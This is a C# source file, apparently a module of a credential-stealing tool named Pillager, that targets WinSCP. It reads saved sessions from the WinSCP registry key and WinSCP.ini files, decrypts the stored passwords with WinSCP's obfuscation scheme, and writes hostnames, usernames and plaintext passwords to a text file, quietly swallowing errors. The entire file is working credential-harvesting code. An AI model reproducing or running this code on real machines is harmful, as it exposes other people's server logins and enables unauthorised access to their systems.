using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Microsoft.Win32;
using Pillager.Helper;

namespace Pillager.FTPs
{
    internal class WinSCP : ICommand
    {
        static readonly int PW_MAGIC = 0xA3;
        static readonly char PW_FLAG = (char)0xFF;

        struct Flags
        {
            public char flag;
            public string remainingPass;
        }

        private Flags DecryptNextCharacterWinSCP(string passwd)
        {
            Flags Flag;
            string bases = "0123456789ABCDEF";

            int firstval = bases.IndexOf(passwd[0]) * 16;
            int secondval = bases.IndexOf(passwd[1]);
            int Added = firstval + secondval;
            Flag.flag = (char)(((~(Added ^ PW_MAGIC) % 256) + 256) % 256);
            Flag.remainingPass = passwd.Substring(2);
            return Flag;
        }

        private string DecryptWinSCPPassword(string Host, string userName, string passWord)
        {
            var clearpwd = string.Empty;
            char length;
            string unicodeKey = userName + Host;
            Flags Flag = DecryptNextCharacterWinSCP(passWord);

            int storedFlag = Flag.flag;

            if (storedFlag == PW_FLAG)
            {
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                length = Flag.flag;
            }
            else
            {
                length = Flag.flag;
            }

            Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
            Flag.remainingPass = Flag.remainingPass.Substring(Flag.flag * 2);

            for (int i = 0; i < length; i++)
            {
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                clearpwd += Flag.flag;
            }
            if (storedFlag == PW_FLAG)
            {
                clearpwd = clearpwd.Substring(0, unicodeKey.Length) == unicodeKey ? clearpwd.Substring(unicodeKey.Length) : "";
            }
            return clearpwd;
        }

        static string ProgramFilesx86()
        {
            if (8 == IntPtr.Size
                || (!String.IsNullOrEmpty(Environment.GetEnvironmentVariable("PROCESSOR_ARCHITEW6432"))))
            {
                return Environment.GetEnvironmentVariable("ProgramFiles(x86)");
            }

            return Environment.GetEnvironmentVariable("ProgramFiles");
        }

        public string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string registry = @"Software\Martin Prikryl\WinSCP 2\Sessions";
            var registryKey = Registry.CurrentUser.OpenSubKey(registry);
            if (registryKey != null)
            {
                foreach (string rname in registryKey.GetSubKeyNames())
                {
                    using (var session = registryKey.OpenSubKey(rname))
                    {
                        if (session != null)
                        {
                            string hostname = (session.GetValue("HostName") != null) ? session.GetValue("HostName").ToString() : "";
                            if (!string.IsNullOrEmpty(hostname))
                            {
                                try
                                {
                                    string username = session.GetValue("UserName").ToString();
                                    string password = session.GetValue("Password").ToString();
                                    sb.AppendLine("hostname: " + hostname);
                                    sb.AppendLine("username: " + username);
                                    sb.AppendLine("rawpass: " + password);
                                    sb.AppendLine("password: " + DecryptWinSCPPassword(hostname, username, password));
                                    sb.AppendLine();
                                }
                                catch
                                { }
                            }
                        }
                    }
                }
            }
            string inipath1 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "WinSCP.ini");
            if (File.Exists(inipath1))
            {
                Pixini pixini = Pixini.Load(inipath1);
                Dictionary<string, List<IniLine>> sectionMap = pixini.sectionMap;
                foreach (var item in sectionMap)
                {
                    if (item.Key.ToLower().StartsWith("sessions"))
                    {
                        string host = "";
                        string user = "";
                        string password = "";
                        List<IniLine> iniLines = item.Value;
                        foreach (var line in iniLines)
                        {
                            if (line.key == null) continue;
                            if (line.key.ToLower() == "hostname") host = line.value;
                            if (line.key.ToLower() == "username") user = line.value;
                            if (line.key.ToLower() == "password") password = line.value;
                        }
                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                            password = DecryptWinSCPPassword(host, user, password);

                        sb.AppendLine("hostname: " + host);
                        sb.AppendLine("username: " + user);
                        sb.AppendLine("password: " + password);
                        sb.AppendLine();
                    }
                }
            }
            string inipath2 = Path.Combine(ProgramFilesx86(), "WinSCP.ini");

            if (File.Exists(inipath2))
            {
                Pixini pixini = Pixini.Load(inipath2);
                Dictionary<string, List<IniLine>> sectionMap = pixini.sectionMap;
                foreach (var item in sectionMap)
                {
                    if (item.Key.ToLower().StartsWith("sessions"))
                    {
                        string host = "";
                        string user = "";
                        string password = "";
                        List<IniLine> iniLines = item.Value;
                        foreach (var line in iniLines)
                        {
                            if (line.key == null) continue;
                            if (line.key.ToLower() == "hostname") host = line.value;
                            if (line.key.ToLower() == "username") user = line.value;
                            if (line.key.ToLower() == "password") password = line.value;
                        }
                        if (!string.IsNullOrEmpty(host) && !string.IsNullOrEmpty(user))
                            password = DecryptWinSCPPassword(host, user, password);

                        sb.AppendLine("hostname: " + host);
                        sb.AppendLine("username: " + user);
                        sb.AppendLine("password: " + password);
                        sb.AppendLine();
                    }
                }
            }


            return sb.ToString();
        }

        public override void Save(string path)
        {
            try
            {
                string output = GetInfo();
                if (!string.IsNullOrEmpty(output))
                {
                    string savepath = Path.Combine(path, "WinSCP");
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, "WinSCP.txt"), output, Encoding.UTF8);
                }
            }
            catch { }
        }
    }
}
